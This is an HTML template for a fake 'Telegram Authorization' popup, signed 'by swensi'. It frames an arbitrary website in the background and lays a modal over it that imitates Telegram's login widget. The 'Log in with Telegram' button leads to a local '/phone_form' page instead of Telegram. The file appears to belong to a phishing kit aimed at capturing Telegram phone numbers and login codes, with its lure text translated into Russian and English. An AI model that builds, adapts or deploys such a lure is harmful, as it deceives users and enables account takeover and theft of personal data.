<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Authorization</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="../static/css/oauth.css?14" rel="stylesheet">
    <link href="../static/css/style.css" rel="stylesheet">
</head>
<body>
    <div class="holder">
        <iframe src="{{bg_link}}" frameborder="0"></iframe>
        <div class="modal" role="dialog">
          <div class="modal-dialog" role="document">
            <div class="modal-content">
              <div class="modal-header">
                <h3 class="modal-title w-100 text-center" id="modal-title"></h3>
              </div>
              <div class="modal-body">
                <section class="login_content">
                  <div class="login_photos">
                    <span class="login_telegram_photo_wrap arrowed">
                      <i class="login_telegram_photo"></i>
                    </span>
                    <a href="{{link}}" target="_blank">
                      <i class="login_bot_photo bgcolor2" data-content="L">
                        <img src="../static/images/{{img}}" alt="Bot Logo">
                      </i>
                    </a>
                  </div>
                  <p id="modal-text" class="text-center"></p>
                </section>
              </div>
              <div class="modal-footer">
                <button class="button-item" type="button" onclick="return toLogin(event)">
                  <a id="modal-btn" href="/phone_form"></a>
                  <span class="ripple-mask"><span class="ripple"></span></span>
                </button>
              </div>
            </div>
          </div>
        </div>
        <div class="signature">
          by <a href="#" target="_blank">swensi</a>
        </div>
    </div>
    <script>
      function toLogin(e) {
        window.location.href = '/phone_form';
      }

      var userLang = navigator.language || navigator.userLanguage;
      var lang = userLang.split('-')[0];

      var translations = {
        ru: {
          title: 'Авторизация',
          text: 'Быстрый способ авторизации через Telegram',
          button: 'Войти с Telegram'
        },
        en: {
          title: 'Authorization',
          text: 'Fast authorization procedure via Telegram',
          button: 'Log in with Telegram'
        }
      };

      var currentLang = translations[lang] || translations.en;
      
      document.getElementById('modal-title').innerHTML = currentLang.title;
      document.getElementById('modal-text').innerHTML = currentLang.text;
      document.getElementById('modal-btn').innerHTML = currentLang.button;
    </script>
</body>
</html>